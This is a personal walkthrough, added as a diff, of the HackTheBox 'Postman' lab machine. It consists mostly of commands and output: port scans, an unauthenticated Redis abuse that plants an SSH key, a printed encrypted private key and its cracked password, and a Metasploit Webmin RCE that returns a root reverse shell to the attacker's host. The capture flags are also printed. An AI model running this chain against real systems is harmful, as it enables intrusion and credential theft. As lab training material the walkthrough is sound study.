@@ -1,0 +1,200 @@
+let's enumerate fist:
+command: sudo rustscan -a 10.10.10.160
+result:
+PORT      STATE SERVICE          REASON
+22/tcp    open  ssh              syn-ack ttl 63
+80/tcp    open  http             syn-ack ttl 63
+6379/tcp  open  redis            syn-ack ttl 63
+10000/tcp open  snet-sensor-mgmt syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80,6379,10000 10.10.10.160
+result:
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Cyber Geek's Personal Website
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2 - 4.9 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 3.16 (94%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 5.1 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+access: http://10.10.10.160/
+
+command: gobuster dir -u http://10.10.10.160 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php -o gobuster-root-80-php
+result:
+===============================================================
+2023/06/14 20:02:09 Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 291]
+/images               (Status: 301) [Size: 313] [--> http://10.10.10.160/images/]
+/upload               (Status: 301) [Size: 313] [--> http://10.10.10.160/upload/]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.10.160/css/]
+/js                   (Status: 301) [Size: 309] [--> http://10.10.10.160/js/]
+/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.160/fonts/]
+
+access: http://10.10.10.160:10000/
+access: https://postman:10000/
+
+command: nc 10.10.10.160 6379
+redis> keys *
+*1
+$4
+0xdf
+
+redis> redis-cli -h 10.10.10.160
+redis> keys *
+(empty array)
+
+redis> incr 0xdf
+(integer) 1
+
+redis> keys *
+1) "0xdf"
+
+redis> get 0xdf
+"1"
+
+redis> config get dir
+1) "dir"
+2) "/var/lib/redis/.ssh"
+
+redis> config set dir /var/lib/redis/.ssh
+OK
+redis> config get dir
+1) "dir"
+2) "/var/lib/redis/.ssh"
+
+command: ssh-keygen -o
+command: (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_key.txt
+command: cat spaced_key.txt| redis-cli -h 10.10.10.160 -x set 0xdf
+
+redis> config set dbfilename "authorized_keys"
+redis> save
+
+command: ssh -i id_rsa redis@10.10.10.160
+
+let's go to /opt
+target> cd /opt
+target> ls -al
+drwxr-xr-x  2 root root 4096 Sep 11  2019 .
+drwxr-xr-x 22 root root 4096 Sep 30  2020 ..
+-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
+
+target> file id_rsa.bak 
+id_rsa.bak: PEM RSA private key
+
+target> cat id_rsa.bak 
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----
+
+let's download and put in out machine.
+command: ssh2john id_rsa_postman_matt_enc > id_rsa_postman_matt.john
+command: john id_rsa_postman_matt.john --wordlist=rockyou.txt
+command: john --show id_rsa_postman_matt.john
+result:
+id_rsa_postman_matt_enc:computer2008
+
+1 password hash cracked, 0 left
+
+redis-target> su Matt
+password: computer2008
+
+command: cat user.txt 
+2c79d1111f5778179f23e14285246caf
+
+let's login:
+access: https://postman:10000/
+username: Matt
+password: computer2008
+
+read csv metasploit:
+access: https://80vul.medium.com/the-stories-behind-cve-2012-5159-198eaad2449d
+
+command: msfconsole
+command: search Webmin
+result:
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank       Check  Description
+   -  ----                                           ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   1  auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
+   2  exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
+   3  exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
+   4  exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+   5  exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
+   6  auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   7  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+
+command: use exploit/linux/http/webmin_packageup_rce
+
+msf6 exploit(linux/http/webmin_packageup_rce) > set lhost 10.10.16.3
+lhost => 10.10.16.3
+msf6 exploit(linux/http/webmin_packageup_rce) > setl port 7979
+[-] Unknown command: setl
+msf6 exploit(linux/http/webmin_packageup_rce) > set password computer2008
+password => computer2008
+msf6 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160
+rhosts => 10.10.10.160
+msf6 exploit(linux/http/webmin_packageup_rce) > set rport 10000
+rport => 10000
+msf6 exploit(linux/http/webmin_packageup_rce) > set ssl true
+[!] Changing the SSL option's value may require changing RPORT!
+ssl => true
+msf6 exploit(linux/http/webmin_packageup_rce) > set lport 7979
+lport => 7979
+msf6 exploit(linux/http/webmin_packageup_rce) > set username Matt
+username => Matt
+
+msfconsole> run
+
+command: id && whoami
+uid=0(root) gid=0(root) groups=0(root)
+root
+shell
+root@Postman:~# cat root.txt
+cat root.txt
+4b6814c599b49cb627271f30db6a4729
+
+resource: 
+https://0xdf.gitlab.io/2020/03/14/htb-postman.html
+
+https://infosecwriteups.com/postman-hacktheboxwriteup-6a184e272ba3
